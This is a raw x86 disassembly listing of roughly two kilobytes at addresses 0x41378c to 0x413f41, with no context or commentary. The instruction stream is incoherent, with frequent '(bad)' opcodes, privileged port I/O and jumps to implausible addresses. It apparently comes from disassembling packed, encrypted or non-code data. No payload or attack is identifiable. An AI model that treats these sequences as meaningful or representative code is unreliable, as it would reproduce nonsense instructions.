  41378c:	sub    ebx,0xffffffce
  41378f:	jg     0x41372b
  413791:	jae    0x413753
  413793:	shl    edi,1
  413795:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  413797:	mov    eax,ds:0x654e429f
  41379c:	(bad)  
  41379d:	jns    0x4137bf
  41379f:	cmp    dh,BYTE PTR [edi-0x5a]
  4137a2:	je     0x413778
  4137a4:	data16 (bad) 
  4137a6:	cld    
  4137a7:	lds    ebp,FWORD PTR [eax+0x4bf87c6a]
  4137ad:	adc    al,0x72
  4137af:	retf   0x6893
  4137b2:	repnz push ebp
  4137b4:	or     eax,0xf0c027b2
  4137b9:	fdiv   st,st(1)
  4137bb:	add    esi,DWORD PTR ds:0xaadf0b1f
  4137c1:	mov    dh,0x39
  4137c3:	sbb    dh,bl
  4137c5:	xor    eax,0xc0815248
  4137ca:	lods   eax,DWORD PTR ds:[esi]
  4137cb:	cli    
  4137cc:	xchg   esi,eax
  4137cd:	inc    eax
  4137ce:	and    bl,BYTE PTR [edx+eiz*1]
  4137d1:	pop    edi
  4137d2:	inc    eax
  4137d3:	pop    ecx
  4137d4:	sti    
  4137d5:	xor    edi,DWORD PTR [esi]
  4137d7:	enter  0xa1fc,0x41
  4137db:	sbb    al,0x18
  4137dd:	test   eax,0xbc196717
  4137e2:	add    ch,BYTE PTR [edx-0x1b]
  4137e5:	push   es
  4137e6:	cwde   
  4137e7:	sbb    DWORD PTR [esi+0x3d],0x48942b55
  4137ee:	or     al,0x6d
  4137f0:	stc    
  4137f1:	fadd   DWORD PTR [ebp+0x3c92c787]
  4137f7:	push   ebx
  4137f8:	sahf   
  4137f9:	aad    0xff
  4137fb:	out    0x51,al
  4137fd:	mov    ch,bl
  4137ff:	and    DWORD PTR [esp+ecx*4-0x2f],edi
  413803:	mul    DWORD PTR [ebp-0x49]
  413806:	out    0xb5,al
  413808:	ret    0x8e01
  41380b:	in     al,0xff
  41380d:	jmp    0xdebd6907
  413812:	into   
  413813:	mov    eax,ds:0xff8722d1
  413818:	jno    0x41384b
  41381a:	outs   dx,DWORD PTR ds:[esi]
  41381b:	int3   
  41381c:	push   ebp
  41381d:	rcr    BYTE PTR [edx],1
  41381f:	loope  0x4137d6
  413821:	push   0xbd8b8ad6
  413826:	add    bl,cl
  413828:	pop    esi
  413829:	dec    edx
  41382a:	adc    ch,bh
  41382c:	fsubr  QWORD PTR [edi+0x2e]
  41382f:	pop    ebx
  413830:	imul   edi,DWORD PTR [ecx],0xf066d8c9
  413836:	prefetchw BYTE PTR [ebp+eax*2-0x47]
  41383b:	daa    
  41383c:	es xor al,0x8
  41383f:	mov    esi,0x41879360
  413844:	push   ebx
  413845:	lahf   
  413846:	xchg   ebp,eax
  413847:	enter  0x9798,0x3
  41384b:	icebp  
  41384c:	adc    bl,BYTE PTR [edi+0x559e28a2]
  413852:	stos   BYTE PTR es:[edi],al
  413853:	dec    edx
  413854:	jno    0x4137ea
  413856:	pushf  
  413857:	fidiv  DWORD PTR [ebp+0x49]
  41385a:	push   edx
  41385b:	and    cl,ah
  41385d:	lods   eax,DWORD PTR ds:[esi]
  41385e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41385f:	sti    
  413860:	jge    0x413837
  413862:	pop    edx
  413863:	pop    ebx
  413864:	mov    edx,0xb2b200ed
  413869:	or     DWORD PTR [esi-0x62],esp
  41386c:	cmp    al,0xb4
  41386e:	ret    
  41386f:	xor    edx,DWORD PTR gs:[eax]
  413872:	mov    WORD PTR [edi+0x38],es
  413875:	popa   
  413876:	adc    esi,esp
  413878:	adc    al,0x85
  41387a:	adc    DWORD PTR [edx+0x74],esi
  41387d:	xor    DWORD PTR [ebx-0x529dd81],esp
  413883:	into   
  413884:	mov    eax,ds:0x11805989
  413889:	rcr    BYTE PTR [esi],cl
  41388b:	mov    bl,0xec
  41388d:	jg     0x413849
  41388f:	mov    bh,0x28
  413891:	outs   dx,DWORD PTR ds:[esi]
  413892:	sbb    eax,0x370081ec
  413897:	xchg   esi,eax
  413898:	add    DWORD PTR [edi+edi*1-0xe749f07],esp
  41389f:	add    ebp,edx
  4138a1:	and    eax,0x4744e2f1
  4138a6:	inc    edi
  4138a7:	test   DWORD PTR [ebp+0x48e2fa80],ebp
  4138ad:	jns    0x4138c4
  4138af:	push   ds
  4138b0:	push   es
  4138b1:	xor    BYTE PTR [ecx],ah
  4138b3:	das    
  4138b4:	push   es
  4138b5:	xor    ebx,DWORD PTR [eax+0x4a]
  4138b8:	sbb    BYTE PTR [eax-0xb],al
  4138bb:	xchg   BYTE PTR ds:0x8618aa5a,bl
  4138c1:	out    dx,al
  4138c2:	push   esi
  4138c3:	sub    DWORD PTR [esi-0x30],edx
  4138c6:	pop    ss
  4138c7:	fisub  DWORD PTR [edx-0xdeaf8eb]
  4138cd:	shl    DWORD PTR [eax+edx*4],1
  4138d0:	or     al,0x41
  4138d2:	inc    ecx
  4138d3:	mov    eax,ds:0x55b032e0
  4138d8:	and    edx,DWORD PTR [eax-0x7]
  4138db:	xchg   esp,eax
  4138dc:	popf   
  4138dd:	xor    al,0x61
  4138df:	cs stos BYTE PTR es:[edi],al
  4138e1:	xchg   edi,eax
  4138e2:	or     ebp,DWORD PTR [edi+0x79b5d90a]
  4138e8:	ret    
  4138e9:	sti    
  4138ea:	pop    ds
  4138eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ec:	retf   0xbd69
  4138ef:	mov    dh,0x3
  4138f1:	repz imul ebx,DWORD PTR [ebx+ebp*2],0xfffffff6
  4138f6:	(bad)  
  4138f7:	inc    edi
  4138f8:	cli    
  4138f9:	mov    al,0x1c
  4138fb:	leave  
  4138fc:	sbb    bh,BYTE PTR [eax-0x52b8cf90]
  413902:	mov    dh,0x9b
  413904:	mov    ds:0x5b22a7e,al
  413909:	sub    ah,BYTE PTR ds:0xacb50800
  41390f:	jns    0x413925
  413911:	xlat   BYTE PTR ds:[ebx]
  413912:	pusha  
  413913:	xchg   ebx,eax
  413914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413915:	cs push es
  413917:	add    al,0x94
  413919:	jecxz  0x4138af
  41391b:	daa    
  41391c:	xchg   edx,eax
  41391d:	adc    edi,ebp
  41391f:	add    BYTE PTR [edi],0xf5
  413922:	inc    ecx
  413923:	push   ss
  413924:	inc    edx
  413925:	ret    0x66a6
  413928:	xchg   edi,eax
  413929:	(bad)  
  41392b:	xor    edx,DWORD PTR [esi]
  41392d:	sub    al,0x65
  41392f:	adc    edx,ebx
  413931:	inc    edi
  413932:	gs aas 
  413934:	push   ds
  413935:	dec    eax
  413936:	mov    cl,0x25
  413938:	imul   esi,ecx,0x89aeea6f
  41393e:	add    eax,0x7a8b2d14
  413943:	xor    DWORD PTR [edx+0x4],eax
  413946:	mov    cl,BYTE PTR [edx-0x4f]
  413949:	sub    BYTE PTR [edx-0x2515c274],dh
  41394f:	pop    edx
  413950:	fs jne 0x413948
  413953:	test   ebp,edx
  413955:	push   ebp
  413956:	cmc    
  413957:	jae    0x4139d8
  413959:	shr    DWORD PTR [edx+eiz*4+0x32c38d4d],cl
  413960:	scas   eax,DWORD PTR es:[edi]
  413961:	pop    ebp
  413962:	xor    eax,0x2a6fdc17
  413967:	in     al,0xe1
  413969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41396a:	xchg   esp,eax
  41396b:	std    
  41396c:	icebp  
  41396d:	ret    
  41396e:	mov    DWORD PTR [ebp-0x47],0x7bb2aea0
  413975:	jl     0x413937
  413977:	and    al,BYTE PTR ds:0xec9b2958
  41397d:	sbb    cl,ch
  41397f:	stos   BYTE PTR es:[edi],al
  413980:	imul   ecx,esp,0x5f
  413983:	push   0xf21e19b3
  413988:	shl    eax,1
  41398a:	xchg   edi,eax
  41398b:	scas   al,BYTE PTR es:[edi]
  41398c:	sub    al,0xba
  41398e:	mov    edx,0xa51bba05
  413993:	inc    esp
  413994:	inc    esp
  413995:	popa   
  413996:	adc    DWORD PTR [edi],ecx
  413998:	sub    al,0x52
  41399a:	ds push esp
  41399c:	inc    ebp
  41399d:	mov    edx,esp
  41399f:	outs   dx,BYTE PTR ds:[esi]
  4139a0:	ins    BYTE PTR es:[edi],dx
  4139a1:	pusha  
  4139a2:	push   DWORD PTR [edx]
  4139a4:	aaa    
  4139a5:	mov    ah,0xa5
  4139a7:	and    bh,BYTE PTR [ecx]
  4139a9:	xchg   ebx,eax
  4139aa:	xchg   DWORD PTR [ebx+eax*2-0x5b901a06],eax
  4139b1:	mov    dl,0x25
  4139b3:	out    0xa5,eax
  4139b5:	jmp    0xc8b5:0xdc54d049
  4139bc:	add    DWORD PTR [ecx+0x1c81dcd5],0x58546748
  4139c6:	mov    esp,0x329bc7b9
  4139cb:	aas    
  4139cc:	push   0x66
  4139ce:	loope  0x413a05
  4139d0:	pop    esi
  4139d1:	xor    BYTE PTR [edi+0x27297ef7],0xc5
  4139d8:	cmp    eax,0xe196a1ff
  4139dd:	retf   
  4139de:	or     al,0x52
  4139e0:	enter  0x4add,0xc1
  4139e4:	xor    DWORD PTR [edi],esp
  4139e6:	push   ecx
  4139e7:	inc    edi
  4139e8:	mov    cl,0x53
  4139ea:	push   eax
  4139eb:	outs   dx,DWORD PTR ds:[esi]
  4139ec:	push   ebp
  4139ed:	ss xchg ebp,eax
  4139ef:	(bad)  
  4139f0:	dec    ebp
  4139f1:	mov    bl,0xd7
  4139f3:	dec    esi
  4139f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139f5:	sbb    BYTE PTR [ebp+edi*4+0x29],ah
  4139f9:	add    al,0xee
  4139fb:	mov    ch,0x6
  4139fd:	in     al,dx
  4139fe:	ins    DWORD PTR es:[edi],dx
  4139ff:	dec    eax
  413a00:	ficom  WORD PTR [ebp-0x45e0548f]
  413a06:	jo     0x413a69
  413a08:	add    BYTE PTR [edx-0x3aa58c4b],0xa1
  413a0f:	fxch   st(5)
  413a11:	push   edx
  413a12:	popf   
  413a13:	jmp    0x486f167d
  413a18:	stc    
  413a19:	aaa    
  413a1a:	or     BYTE PTR [eax],cl
  413a1c:	pushf  
  413a1d:	call   0x47480f79
  413a22:	mov    BYTE PTR [ebp-0x678d32b7],dh
  413a28:	(bad)  
  413a2a:	fdiv   DWORD PTR [eax]
  413a2c:	cmc    
  413a2d:	cld    
  413a2e:	fld    TBYTE PTR [esi]
  413a30:	jno    0x413a13
  413a32:	pop    ecx
  413a33:	push   ebx
  413a34:	adc    eax,0x50be40d0
  413a39:	jl     0x413a72
  413a3b:	push   di
  413a3d:	jbe    0x413a5c
  413a3f:	(bad)  
  413a40:	xor    dl,BYTE PTR [edx+0x2057a5ca]
  413a46:	jge    0x413a8c
  413a48:	imul   edi,DWORD PTR [ebx],0x8ea7e2a5
  413a4e:	jmp    0x4a33bedc
  413a53:	jnp    0x413a37
  413a55:	nop
  413a56:	cmp    bh,BYTE PTR [eax+0x75]
  413a59:	and    al,0x2a
  413a5b:	jbe    0x4139ff
  413a5d:	mov    edi,0x884e8157
  413a62:	pusha  
  413a63:	inc    edx
  413a64:	mov    eax,ds:0x3a7bbcb0
  413a69:	sar    ebp,1
  413a6b:	ficomp WORD PTR [ecx+0x39]
  413a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a6f:	outs   dx,BYTE PTR ds:[esi]
  413a70:	add    DWORD PTR [eax-0x45a95003],esi
  413a76:	scas   al,BYTE PTR es:[edi]
  413a77:	(bad)  [ebp+esi*1-0xe]
  413a7b:	int3   
  413a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a7d:	lea    ebx,[ebp+0xe]
  413a80:	mov    esp,0xcf5a7240
  413a85:	cli    
  413a86:	jnp    0x413ac6
  413a88:	dec    edi
  413a89:	pop    esp
  413a8a:	and    eax,0xf2ed3d47
  413a8f:	rcr    BYTE PTR [edx+0x12],cl
  413a92:	sbb    ebx,DWORD PTR [esi+0x13]
  413a95:	fndisi(8087 only) 
  413a97:	mov    bh,0x90
  413a99:	stos   DWORD PTR es:[edi],eax
  413a9a:	push   esp
  413a9b:	push   ss
  413a9c:	sub    al,0x9
  413a9e:	cmp    al,0x39
  413aa0:	les    edi,FWORD PTR [esi+0x652b14d1]
  413aa6:	and    cl,ah
  413aa8:	push   edi
  413aa9:	jae    0x413ab4
  413aab:	rol    DWORD PTR [eax+eax*1-0x20bfd3da],0x1a
  413ab3:	mov    ecx,0x1c3d5c75
  413ab8:	mov    edx,0x9701ba66
  413abd:	repnz (bad)
  413ac0:	loopne 0x413b17
  413ac2:	xor    edi,DWORD PTR [edx-0x74f6ba89]
  413ac8:	cmp    BYTE PTR [edi+0x7d8adf54],ch
  413ace:	jl     0x413ae9
  413ad0:	inc    edi
  413ad1:	dec    esi
  413ad2:	or     BYTE PTR [edi-0x4db80761],ch
  413ad8:	test   DWORD PTR [ecx+ebx*1+0x1a],esi
  413adc:	push   edx
  413add:	xor    BYTE PTR [eax],0x8
  413ae0:	pusha  
  413ae1:	xor    ah,BYTE PTR [ecx+0x28]
  413ae4:	adc    eax,0x347c0fb4
  413ae9:	sub    dl,BYTE PTR [eax]
  413aeb:	mov    ?,WORD PTR [edi]
  413aed:	shr    DWORD PTR [ebx+0x33],cl
  413af0:	shr    ebx,0x9b
  413af3:	stos   DWORD PTR es:[edi],eax
  413af4:	sub    ch,BYTE PTR [edx+esi*4-0x14]
  413af8:	pop    ecx
  413af9:	inc    edx
  413afa:	call   0x197:0xedb3a4d6
  413b01:	jle    0x413ac4
  413b03:	ret    
  413b04:	sbb    al,0x25
  413b06:	ins    DWORD PTR es:[edi],dx
  413b07:	xor    al,0x43
  413b09:	rol    DWORD PTR [esi+eax*1-0x4f],0x9c
  413b0e:	out    0xf4,eax
  413b10:	dec    esi
  413b11:	mov    eax,0x1016c5c0
  413b16:	in     al,0x5c
  413b18:	jg     0x413adc
  413b1a:	push   ecx
  413b1b:	and    al,0x20
  413b1d:	out    dx,eax
  413b1e:	mov    BYTE PTR [edx-0x307cf8a8],ah
  413b24:	dec    esp
  413b25:	aaa    
  413b26:	jge    0x413b03
  413b28:	xchg   edx,eax
  413b29:	outs   dx,BYTE PTR ds:[esi]
  413b2a:	sti    
  413b2b:	jo     0x413ba8
  413b2d:	adc    eax,0xf82f7582
  413b32:	aam    0x82
  413b34:	mov    ebp,0x9cf197b6
  413b39:	jne    0x413af3
  413b3b:	pop    esp
  413b3c:	pop    edi
  413b3d:	push   es
  413b3e:	popf   
  413b3f:	mov    al,0x5c
  413b41:	aaa    
  413b42:	mov    bl,BYTE PTR [eax+0x69]
  413b45:	mov    ah,0x80
  413b47:	loope  0x413b0c
  413b49:	div    BYTE PTR [eax-0x32]
  413b4c:	(bad)  
  413b4d:	push   eax
  413b4e:	ins    DWORD PTR es:[edi],dx
  413b4f:	dec    esi
  413b50:	push   es
  413b51:	test   DWORD PTR [eax],ebp
  413b53:	xchg   edx,eax
  413b54:	jns    0x413bb6
  413b56:	mov    dl,0x8d
  413b58:	mov    ds:0xb04cc2b4,eax
  413b5d:	mov    esp,0xf9d216ac
  413b62:	enter  0xc54f,0x26
  413b66:	jp     0x413b8d
  413b68:	inc    edi
  413b69:	sbb    ebp,eax
  413b6b:	scas   al,BYTE PTR es:[edi]
  413b6c:	sub    ah,dl
  413b6e:	or     ebp,DWORD PTR es:[ebp+0x5d9b3711]
  413b75:	or     ch,bl
  413b77:	retf   
  413b78:	mov    eax,DWORD PTR [edi+eiz*4+0x6f1f0199]
  413b7f:	xor    dl,BYTE PTR [edx-0x759e6a1a]
  413b85:	xor    edi,DWORD PTR [edx-0xf2b04aa]
  413b8b:	mov    edi,0x85d440ea
  413b90:	daa    
  413b91:	and    BYTE PTR [edx+eiz*1],ah
  413b94:	or     DWORD PTR [ecx],0xfdabf7fe
  413b9a:	gs clc 
  413b9c:	xor    BYTE PTR gs:[ebx-0x4a5c1c4b],bl
  413ba3:	inc    edi
  413ba4:	inc    edi
  413ba5:	sub    dh,0x32
  413ba8:	sub    DWORD PTR [eax-0x77c84cea],ecx
  413bae:	std    
  413baf:	aaa    
  413bb0:	xchg   BYTE PTR [esi],dl
  413bb2:	outs   dx,DWORD PTR ds:[esi]
  413bb3:	xchg   ebx,eax
  413bb4:	imul   esp,DWORD PTR [edi],0xf24d87db
  413bba:	sahf   
  413bbb:	popf   
  413bbc:	sub    DWORD PTR [edx+0x49],eax
  413bbf:	or     BYTE PTR [ecx-0x19],0x2a
  413bc3:	mov    al,ds:0x85801d2c
  413bc8:	cli    
  413bc9:	mov    ch,0xb4
  413bcb:	inc    ebx
  413bcc:	jbe    0x413b83
  413bce:	idiv   DWORD PTR [ebp-0x11]
  413bd1:	jne    0x413c44
  413bd3:	push   0xc9efb2b2
  413bd8:	and    DWORD PTR [esi],ecx
  413bda:	add    BYTE PTR [ecx],dh
  413bdc:	pop    esi
  413bdd:	test   al,0x79
  413bdf:	and    ebp,ebp
  413be1:	add    esi,DWORD PTR [ecx+0x6c]
  413be4:	push   ebx
  413be5:	aaa    
  413be6:	test   al,0x30
  413be8:	mov    ah,0x28
  413bea:	add    al,cl
  413bec:	pop    ebx
  413bed:	fldenv [ebp-0x2ba5ff5e]
  413bf3:	push   esi
  413bf4:	out    0x12,eax
  413bf6:	mov    al,0x56
  413bf8:	retf   0x6cc2
  413bfb:	mov    ebx,0x8a9ad4f4
  413c00:	mov    dl,0x5a
  413c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c03:	test   al,0xc1
  413c05:	pop    ds
  413c06:	cmp    ch,dh
  413c08:	inc    esi
  413c09:	addr16 cld 
  413c0b:	out    dx,al
  413c0c:	ja     0x413be3
  413c0e:	add    eax,0xbdaf08a
  413c13:	push   esi
  413c14:	call   0x2fa3:0x6426c78
  413c1b:	pop    edx
  413c1c:	aad    0xd5
  413c1e:	int3   
  413c1f:	pushf  
  413c20:	and    cl,ah
  413c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c23:	pop    esp
  413c24:	jmp    0x8b04e64
  413c29:	xchg   edi,eax
  413c2a:	push   es
  413c2b:	and    esi,0xffffff81
  413c2e:	xchg   edi,eax
  413c2f:	lods   al,BYTE PTR ds:[esi]
  413c30:	jg     0x413c0e
  413c32:	std    
  413c33:	pop    ds
  413c34:	(bad)  
  413c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c36:	or     al,0x53
  413c38:	jo     0x413bdc
  413c3a:	xor    cl,ch
  413c3c:	lods   al,BYTE PTR ds:[esi]
  413c3d:	mov    al,ds:0xb16a0e26
  413c42:	loop   0x413c07
  413c44:	mov    bl,BYTE PTR [eax+0x71777369]
  413c4a:	cli    
  413c4b:	xor    DWORD PTR [edi+0x5eec6cd],edx
  413c51:	scas   eax,DWORD PTR es:[edi]
  413c52:	and    DWORD PTR [esi],0xffffffde
  413c55:	cli    
  413c56:	xchg   ebx,eax
  413c57:	sbb    ebx,edi
  413c59:	xor    BYTE PTR ds:0xaabb9894,dh
  413c5f:	xor    esi,DWORD PTR [ebx-0x304cae79]
  413c65:	add    ebp,DWORD PTR [eax]
  413c67:	jmp    edi
  413c69:	aaa    
  413c6a:	sbb    eax,0x6717d099
  413c6f:	sub    BYTE PTR cs:[edx],dl
  413c72:	test   eax,0x270ccad3
  413c77:	dec    esp
  413c78:	lahf   
  413c79:	or     esp,0x15
  413c7c:	and    DWORD PTR [esi-0x352060e3],edx
  413c82:	sti    
  413c83:	lods   al,BYTE PTR ds:[si]
  413c85:	mov    bh,0x49
  413c87:	mov    ah,0x28
  413c89:	add    eax,0x485f7446
  413c8e:	push   esp
  413c8f:	mul    BYTE PTR [edi-0x326c5c00]
  413c95:	push   edi
  413c96:	dec    eax
  413c97:	cld    
  413c98:	mov    bx,0x1f47
  413c9c:	xor    al,al
  413c9e:	xchg   esp,eax
  413c9f:	retf   
  413ca0:	pop    ds
  413ca1:	xchg   edx,eax
  413ca2:	leave  
  413ca3:	loop   0x413cc1
  413ca5:	sbb    al,0xae
  413ca7:	mov    dl,0x6b
  413ca9:	xchg   edx,eax
  413caa:	(bad)  
  413cab:	das    
  413cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cad:	jp     0x413c60
  413caf:	retf   
  413cb0:	dec    eax
  413cb1:	icebp  
  413cb2:	push   es
  413cb3:	push   ebp
  413cb4:	add    BYTE PTR [eax+0x5652da8e],cl
  413cba:	pop    ebx
  413cbb:	dec    ebx
  413cbc:	lds    ebp,FWORD PTR [ebp+0x57a4a922]
  413cc2:	sbb    al,0x51
  413cc4:	xchg   BYTE PTR [edx],ah
  413cc6:	enter  0x8b9e,0x3b
  413cca:	or     al,0x1c
  413ccc:	(bad)  
  413ccd:	push   ebx
  413cce:	call   0x6d73c91a
  413cd3:	retf   
  413cd4:	jno    0x413ca9
  413cd6:	jno    0x413cf4
  413cd8:	push   ebp
  413cd9:	int3   
  413cda:	pop    eax
  413cdb:	nop
  413cdc:	arpl   WORD PTR [esi+0x45],di
  413cdf:	pop    ebx
  413ce0:	pop    edi
  413ce1:	ror    BYTE PTR [ecx+0xe8abf5f],1
  413ce7:	ret    0x6837
  413cea:	imul   esi,DWORD PTR ds:0x92742bfb,0x40
  413cf1:	xor    al,BYTE PTR [ecx+0x55d81f4b]
  413cf7:	mov    BYTE PTR [ebx-0x6e],0x77
  413cfb:	int3   
  413cfc:	pop    ecx
  413cfd:	ja     0x413cf2
  413cff:	leave  
  413d00:	inc    ecx
  413d01:	xlat   BYTE PTR ds:[ebx]
  413d02:	jge    0x413ccb
  413d04:	adc    edx,DWORD PTR [ebp*1+0x3f006801]
  413d0b:	dec    edx
  413d0c:	mov    cl,0x18
  413d0e:	push   0x3e
  413d10:	jno    0x413d29
  413d12:	inc    eax
  413d13:	ret    0x7dc
  413d16:	in     eax,dx
  413d17:	adc    al,0x79
  413d19:	mov    ?,ebp
  413d1b:	popf   
  413d1c:	icebp  
  413d1d:	xchg   esp,eax
  413d1e:	popf   
  413d1f:	push   0xfc101f23
  413d24:	push   esp
  413d25:	jno    0x413d01
  413d27:	jns    0x413d3b
  413d29:	call   0xef78:0x7de14622
  413d30:	repz mov dh,0x4f
  413d33:	mov    ds:0x9d9738af,al
  413d38:	test   BYTE PTR [edx],cl
  413d3a:	push   cs
  413d3b:	fadd   st(5),st
  413d3d:	and    al,0xa7
  413d3f:	push   cs
  413d40:	jb     0x413d70
  413d42:	es push ds
  413d44:	push   ecx
  413d45:	daa    
  413d46:	sbb    BYTE PTR [esi],dl
  413d48:	mov    ebp,0x5ca11e1b
  413d4d:	xor    eax,0xc836f7e
  413d52:	iret   
  413d53:	push   esp
  413d55:	data16 jle 0x413dca
  413d58:	shr    dh,1
  413d5a:	rcl    esp,cl
  413d5c:	and    eax,0x5c76dcbd
  413d61:	int    0x91
  413d63:	pop    ebx
  413d64:	sti    
  413d65:	shl    BYTE PTR [eax-0x69563ff2],1
  413d6b:	neg    BYTE PTR [ebp-0x1f79f337]
  413d71:	outs   dx,DWORD PTR ds:[esi]
  413d72:	pop    ebp
  413d73:	or     DWORD PTR [esi-0x34525135],esp
  413d79:	inc    esi
  413d7a:	sbb    eax,DWORD PTR [ecx+0x11]
  413d7d:	sub    BYTE PTR [edi-0x192a6b69],ah
  413d83:	leave  
  413d84:	xchg   ebp,eax
  413d85:	mov    cl,0xd7
  413d87:	cmp    BYTE PTR [ebx+eax*1+0x23452b06],0xf3
  413d8f:	out    0xec,eax
  413d91:	aas    
  413d92:	cmp    al,bl
  413d94:	div    BYTE PTR es:[edi-0x307e2fcc]
  413d9b:	xor    DWORD PTR [edi+ecx*4],edx
  413d9e:	jb     0x413df6
  413da0:	xchg   edi,eax
  413da1:	mov    al,0xaf
  413da3:	dec    ebp
  413da4:	pop    eax
  413da5:	loop   0x413e23
  413da7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413da8:	xchg   ebx,eax
  413da9:	lods   eax,DWORD PTR ds:[esi]
  413daa:	push   0x55323213
  413daf:	push   ebp
  413db0:	leave  
  413db1:	xor    eax,0x72ff4d34
  413db6:	dec    esp
  413db7:	test   al,0x6d
  413db9:	addr16 aas 
  413dbb:	loop   0x413dd8
  413dbd:	sbb    dh,BYTE PTR [edx+0x336d4d3e]
  413dc3:	aad    0x75
  413dc5:	add    edx,DWORD PTR fs:[ebx-0xb54ff70]
  413dcc:	repz inc edx
  413dce:	out    dx,al
  413dcf:	retf   0x12c
  413dd2:	cli    
  413dd3:	ins    BYTE PTR es:[edi],dx
  413dd4:	cmp    ebp,esi
  413dd6:	adc    edi,DWORD PTR [edx+edi*8+0x12464c1f]
  413ddd:	push   DWORD PTR [ecx-0x3eb0087d]
  413de3:	nop
  413de4:	into   
  413de5:	cmp    DWORD PTR [ebp+0x69],0x6bc09b1
  413dec:	and    DWORD PTR [ebp+0x7d2a1f5],ebp
  413df2:	mov    esp,0xb00094a
  413df7:	push   0xd84649dc
  413dfc:	std    
  413dfd:	shr    ah,cl
  413dff:	(bad)  
  413e00:	arpl   WORD PTR [ecx+0x76a688b3],di
  413e06:	mov    BYTE PTR [eax-0x49080d0e],dh
  413e0c:	add    eax,0x18d9b619
  413e11:	jle    0x413df0
  413e13:	mov    eax,ds:0xc27c6e5
  413e18:	xchg   edx,eax
  413e19:	out    dx,eax
  413e1a:	(bad)  
  413e1b:	pop    ebx
  413e1c:	test   DWORD PTR [esi+0x54],ecx
  413e1f:	mov    eax,ds:0xc68cce0d
  413e24:	mov    dh,0xd7
  413e26:	imul   ecx,DWORD PTR [edi],0x52
  413e29:	arpl   WORD PTR [edi],di
  413e2b:	xchg   edx,eax
  413e2c:	sbb    eax,0xe4f64d4e
  413e31:	sbb    eax,0xdbb8c5e3
  413e36:	xor    esi,DWORD PTR [ebp+0x37feeea8]
  413e3c:	push   cs
  413e3d:	ret    
  413e3e:	mov    eax,0x7ab47bc8
  413e44:	(bad)  
  413e45:	mov    bl,0x1f
  413e47:	dec    esi
  413e48:	xor    cl,BYTE PTR [edi+0x7491fc1f]
  413e4e:	inc    edx
  413e4f:	pop    edi
  413e50:	int    0x8
  413e52:	cmp    al,0xaf
  413e54:	add    bl,ah
  413e56:	or     al,0xc9
  413e58:	xor    bh,BYTE PTR [ebx+0xa45c63b]
  413e5e:	lahf   
  413e5f:	mov    ds:0x6ad4fb08,eax
  413e64:	jle    0x413e9d
  413e66:	jl     0x413eba
  413e68:	adc    al,0x53
  413e6a:	cmp    bl,BYTE PTR [edx-0x9]
  413e6d:	mov    bl,0x54
  413e6f:	je     0x413eec
  413e71:	and    eax,0x8c73cdd8
  413e76:	and    edx,ebx
  413e78:	pushf  
  413e79:	dec    edi
  413e7a:	and    esi,DWORD PTR [esi]
  413e7c:	ror    BYTE PTR [edx-0x10],1
  413e7f:	out    dx,eax
  413e80:	xchg   edi,eax
  413e81:	xor    dl,BYTE PTR [eax+eax*4]
  413e84:	mov    esp,0x3973f9b7
  413e89:	xchg   ecx,eax
  413e8a:	out    0xf8,eax
  413e8c:	fstp   QWORD PTR [eax]
  413e8e:	es mov ch,0xc
  413e91:	mov    ecx,0xf5fd1ab4
  413e96:	jae    0x413e42
  413e98:	add    DWORD PTR [ecx-0x78],eax
  413e9b:	mov    ebp,0x2bee2183
  413ea0:	pop    edi
  413ea1:	imul   esi,DWORD PTR [eax-0x59],0xbd325c37
  413ea8:	mov    al,dh
  413eaa:	sbb    BYTE PTR [ebp+0x7fda9183],ah
  413eb0:	pop    es
  413eb1:	ja     0x413f29
  413eb3:	push   ecx
  413eb4:	icebp  
  413eb5:	mov    esi,0xf4cd1801
  413eba:	jge    0x413e3f
  413ebc:	(bad)  [eax-0x20]
  413ebf:	xor    al,dl
  413ec1:	in     eax,0xa7
  413ec3:	outs   dx,BYTE PTR ds:[esi]
  413ec4:	ret    0xa68
  413ec7:	call   DWORD PTR [edx+0x2a]
  413eca:	out    dx,al
  413ecb:	push   ecx
  413ecc:	mov    ds:0xa64a445b,al
  413ed1:	ds ss jno 0x413edb
  413ed5:	pop    eax
  413ed6:	nop
  413ed7:	mov    al,0x2c
  413ed9:	out    dx,al
  413eda:	test   al,0xa
  413edc:	pop    ds
  413edd:	xchg   esp,eax
  413ede:	fld    QWORD PTR [esi-0x682c0a55]
  413ee4:	gs sahf 
  413ee6:	cs out dx,eax
  413ee8:	pop    esi
  413ee9:	push   ds
  413eea:	inc    esi
  413eeb:	clc    
  413eec:	ret    
  413eed:	add    dh,ch
  413eef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ef0:	data16 aad 0xdd
  413ef3:	pusha  
  413ef4:	retf   
  413ef5:	push   esp
  413ef6:	adc    DWORD PTR [edx-0x560aac6e],ebp
  413efc:	fnstenv gs:0xab749d73
  413f03:	fs xor eax,0xdf9cef87
  413f09:	mov    ebx,0x5893e0e9
  413f0e:	sub    bh,ah
  413f10:	outs   dx,DWORD PTR ds:[esi]
  413f11:	or     al,0x8e
  413f13:	loope  0x413f80
  413f15:	dec    ebp
  413f16:	push   0x41
  413f18:	jecxz  0x413f83
  413f1a:	adc    ecx,DWORD PTR [edx+0x65]
  413f1d:	mov    cl,0xa2
  413f1f:	jg     0x413f60
  413f21:	push   esi
  413f22:	mov    al,ds:0x360dd74a
  413f27:	ins    DWORD PTR es:[edi],dx
  413f28:	inc    esp
  413f29:	repz sub eax,ecx
  413f2c:	cmp    eax,edx
  413f2e:	push   ds
  413f2f:	nop
  413f30:	inc    esi
  413f31:	dec    ecx
  413f32:	test   DWORD PTR [edi-0x1c],0x1a67de24
  413f39:	jbe    0x413f3c
  413f3b:	xchg   BYTE PTR [ebx+0xbf41b96],bl
  413f41:	out    dx,eax
